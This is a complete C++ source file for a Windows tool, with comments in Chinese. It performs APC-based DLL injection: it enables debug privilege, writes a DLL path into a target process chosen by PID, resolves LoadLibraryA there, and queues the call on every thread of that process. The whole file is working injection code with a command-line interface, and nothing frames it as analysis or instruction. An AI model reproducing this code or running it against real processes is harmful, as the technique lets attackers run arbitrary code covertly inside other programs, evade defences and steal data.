#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include<cstdio>
#include<string>
#include <algorithm>
#include<fstream>
#include<vector>
#include <aclapi.h>
#include <sddl.h>
#include <cstdlib>
#include <psapi.h>
#include <TlHelp32.h>
#include <wbemidl.h>
#include <comdef.h>
#include <psapi.h>
 bool EnableDebugPrivilege152() {
    HANDLE hToken;
    LUID sedebugguid;
    TOKEN_PRIVILEGES tkp;
 
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken error: " << GetLastError() << std::endl;
        return false;
    }
 
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugguid)) {
        std::cerr << "LookupPrivilegeValue error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }
 
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugguid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
    if (!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL)) {
        std::cerr << "AdjustTokenPrivileges error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }
	std::cout<<"EnableDebugPrivilege Successfully.\n";
    CloseHandle(hToken);
    return true;
}
// 获取目标进程模块基地址
HMODULE GetRemoteModuleBase(DWORD pid, LPCSTR moduleName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    MODULEENTRY32 me = { sizeof(me) };
    
    if (Module32First(hSnapshot, &me)) {
        do {
            if (_stricmp(me.szModule, moduleName) == 0) {
                CloseHandle(hSnapshot);
                return me.hModule;
            }
        } while (Module32Next(hSnapshot, &me));
    }
    CloseHandle(hSnapshot);
    return NULL;
}

// 计算函数在目标进程中的地址
FARPROC CalculateRemoteFunctionAddress(HMODULE localModule, HMODULE remoteModule, LPCSTR funcName) {
    FARPROC localFunc = GetProcAddress(localModule, funcName);
    if (!localFunc) return NULL;
    
    // 计算地址偏移
    DWORD_PTR offset = (DWORD_PTR)localFunc - (DWORD_PTR)localModule;
    return (FARPROC)((DWORD_PTR)remoteModule + offset);
}

// APC注入主函数
bool APCInjection(DWORD pid, LPCSTR dllPath) {
    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "OpenProcess failed: " << GetLastError() << std::endl;
        return false;
    }

    // 在目标进程分配内存
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, 
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // 写入DLL路径
    if (!WriteProcessMemory(hProcess, pRemoteMem, dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // 获取目标进程kernel32基地址
    HMODULE hRemoteKernel32 = GetRemoteModuleBase(pid, "kernel32.dll");
    if (!hRemoteKernel32) {
        std::cerr << "GetRemoteModuleBase failed" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // 获取本地kernel32基地址
    HMODULE hLocalKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hLocalKernel32) {
        std::cerr << "GetModuleHandle failed" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // 计算LoadLibraryA在目标进程的地址
    FARPROC pLoadLibraryA = CalculateRemoteFunctionAddress(
        hLocalKernel32, hRemoteKernel32, "LoadLibraryA");
    
    if (!pLoadLibraryA) {
        std::cerr << "CalculateRemoteFunctionAddress failed" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // 查找目标进程线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    bool injected = false;

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    // 队列APC调用
                    if (QueueUserAPC((PAPCFUNC)pLoadLibraryA, hThread, (ULONG_PTR)pRemoteMem)) {
                        std::cout << "APC injected to thread: " << te.th32ThreadID << std::endl;
                        injected = true;
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    CloseHandle(hProcess);
    return injected;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <PID> <DLL Path>" << std::endl;
        return 1;
    }
	
	EnableDebugPrivilege152();
	
    DWORD pid = atoi(argv[1]);
    LPCSTR dllPath = argv[2];

    if (APCInjection(pid, dllPath)) {
        std::cout << "Inject Successfully.\n" << std::endl;
        return 0;
    } else {
        std::cout << "Inject Failed.\n" << std::endl;
        return 1;
    }
}
